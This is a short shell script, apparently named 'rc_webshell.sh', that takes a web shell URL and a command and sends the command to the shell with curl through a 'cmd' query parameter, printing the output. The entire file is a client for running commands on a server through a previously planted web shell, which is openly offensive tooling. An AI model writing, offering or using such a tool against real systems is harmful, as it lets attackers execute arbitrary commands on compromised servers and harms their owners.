#! /bin/sh

# author: Nullable

usage() {
	echo "\nUsage: rc_webshell.sh <url_to_webshell> <command>"
	exit
}

main() {
	if test $# -ne 2; then
		usage
	fi
	
	echo $(curl "$1?cmd=$2")
}

main $@
